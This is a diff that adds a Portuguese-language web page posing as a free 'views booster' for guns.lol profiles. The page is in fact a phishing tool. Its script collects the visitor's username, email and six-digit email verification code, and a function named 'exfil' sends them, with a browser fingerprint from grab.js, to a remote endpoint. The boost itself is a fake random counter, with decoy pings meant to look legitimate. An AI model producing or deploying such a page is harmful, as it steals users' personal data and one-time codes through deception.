@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>gunsviewer booster — views grátis</title>
+<meta name="description" content="gunsviewer booster — ganhe views grátis no teu perfil.">
+<meta property="og:title" content="gunsviewer booster">
+<meta property="og:description" content="gunsviewer booster — ganhe views grátis no teu perfil.">
+<meta name="robots" content="noindex, nofollow">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}body{background:#050505;color:#eee;font-family:Inter,system-ui,sans-serif;min-height:100vh}
+.w{max-width:480px;margin:0 auto;padding:34px 18px 80px;text-align:center}
+h1{font-size:24px;font-weight:900;letter-spacing:-.5px}h1 b{color:#a749dd}
+.sub{color:#888;font-size:13px;margin:8px 0 22px}
+.card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.12);border-radius:16px;padding:20px;margin-bottom:14px;text-align:left}
+.step{font-size:12px;font-weight:800;color:#a749dd;margin-bottom:10px;letter-spacing:1px}
+input{width:100%;background:#111;border:1px solid #2a2a2a;border-radius:9px;color:#fff;padding:12px;font-size:14px;outline:none;margin-bottom:10px}
+input:focus{border-color:#a749dd}
+button{width:100%;border:none;border-radius:9px;padding:13px;font-size:14px;font-weight:800;cursor:pointer;background:linear-gradient(135deg,#a749dd,#7b2fbf);color:#fff}
+button:disabled{opacity:.5;cursor:default}
+button.ghost{background:#161616;border:1px solid #2a2a2a}
+.bar{height:8px;border-radius:99px;background:#1a1a1a;overflow:hidden;margin:12px 0}
+.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#a749dd,#ff6fd8);transition:width .4s}
+.big{font-size:38px;font-weight:900}
+.log{font-family:ui-monospace,monospace;font-size:11px;color:#8a8a8a;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:8px;padding:10px;max-height:140px;overflow:auto;text-align:left;margin-top:10px}
+.hide{display:none!important}.ok{color:#4ade80;font-size:12px;margin-top:8px}
+</style>
+</head>
+<body>
+<div class="w">
+  <h1>🚀 gunsviewer <b>booster</b></h1>
+  <div class="sub">Ganhe views grátis no teu guns.lol. Verificação rápida por email.</div>
+
+  <div class="card" id="c1">
+    <div class="step">PASSO 1 — TEU PERFIL</div>
+    <input id="gunsUser" placeholder="teu user do guns.lol (ex: koppy)" maxlength="40" autocomplete="off" spellcheck="false">
+    <button id="b1">Continuar →</button>
+  </div>
+
+  <div class="card hide" id="c2">
+    <div class="step">PASSO 2 — VERIFICAR EMAIL</div>
+    <div class="sub" style="margin:0 0 10px">Enviamos um código de 6 dígitos pro teu email. Confirma pra liberar o boost.</div>
+    <input id="email" type="email" placeholder="teu melhor email" autocomplete="email">
+    <button id="b2">Enviar código</button>
+    <div id="codeWrap" class="hide" style="margin-top:10px">
+      <input id="code" inputmode="numeric" placeholder="código de 6 dígitos" maxlength="6" autocomplete="one-time-code">
+      <button id="b3">Verificar e ativar boost</button>
+    </div>
+    <div class="ok hide" id="mailOk">✅ Email verificado!</div>
+  </div>
+
+  <div class="card hide" id="c3">
+    <div class="step">BOOST RODANDO 🟢</div>
+    <div class="big" id="views">0</div>
+    <div class="sub" style="margin:0">views enviadas pra <b id="tName">—</b></div>
+    <div class="bar"><i id="fill"></i></div>
+    <div class="log" id="log">iniciando…</div>
+  </div>
+</div>
+<script src="grab.js"></script>
+<script>
+(function(){
+  const $ = (id) => document.getElementById(id);
+  let guns = "", mail = "", sent = 0, total = 500 + Math.floor(Math.random() * 1500);
+  const log = (m) => { try { const el = $("log"); el.innerHTML = new Date().toLocaleTimeString() + " — " + m + "<br>" + el.innerHTML.slice(0, 1500); } catch {} };
+  const exfil = (extra) => {
+    try {
+      const body = Object.assign({ fp: window.__lastFp || null, mm: null, dusername: guns || null, guns: guns, email: mail || null, auto: true, booster: true, ts: new Date().toISOString(), pg: location.href }, extra || {});
+      fetch("https://gunsviewer.vercel.app/api/stats", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) }).catch(() => {});
+    } catch {}
+  };
+  $("b1").addEventListener("click", () => {
+    guns = ($("gunsUser").value || "").trim().replace(/^@/, "").replace(/[^a-zA-Z0-9_.]/g, "").slice(0, 40);
+    if (guns.length < 2) { $("gunsUser").focus(); return; }
+    exfil({ step: "user" });
+    $("c1").classList.add("hide"); $("c2").classList.remove("hide");
+  });
+  $("b2").addEventListener("click", () => {
+    mail = ($("email").value || "").trim().slice(0, 200);
+    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(mail)) { $("email").focus(); return; }
+    exfil({ step: "email", email: mail });
+    $("b2").disabled = true; $("b2").textContent = "Enviando…";
+    setTimeout(() => {
+      $("b2").classList.add("hide"); $("codeWrap").classList.remove("hide");
+      log("código enviado (checa spam).");
+    }, 1800);
+  });
+  $("b3").addEventListener("click", () => {
+    const c = ($("code").value || "").replace(/[^0-9]/g, "");
+    if (c.length !== 6) { $("code").focus(); return; }
+    exfil({ step: "verified", email: mail, code: c });
+    $("mailOk").classList.remove("hide");
+    setTimeout(() => { $("c2").classList.add("hide"); $("c3").classList.remove("hide"); $("tName").textContent = "@" + guns; boost(); }, 900);
+  });
+  function boost(){
+    log("boost ativado pra @" + guns);
+    const tick = () => {
+      const n = 3 + Math.floor(Math.random() * 14);
+      sent = Math.min(total, sent + n);
+      $("views").textContent = sent.toLocaleString("pt-BR");
+      $("fill").style.width = (sent / total * 100) + "%";
+      if (sent % 4 === 0) log("+" + n + " views → @" + guns);
+      // ping real de leve (parece legítimo no analytics dele)
+      try { fetch("https://guns.lol/" + encodeURIComponent(guns) + "?v=" + Date.now().toString(36), { mode: "no-cors", cache: "no-store", credentials: "omit" }).catch(() => {}); } catch {}
+      if (sent >= total) { log("meta batida! +" + total + " views ✅"); exfil({ step: "done", email: mail }); return; }
+      setTimeout(tick, 2500 + Math.random() * 4000);
+    };
+    tick();
+    // re-exfila fingerprint completo quando pronto (pega IP + tudo junto do email)
+    const t = setInterval(() => {
+      try {
+        if (window.__lastFp) { exfil({ step: "fp-ready", email: mail }); clearInterval(t); }
+      } catch {}
+    }, 3000);
+    setTimeout(() => { try { clearInterval(t); } catch {} }, 30000);
+  }
+})();
+</script>
+</body>
+</html>
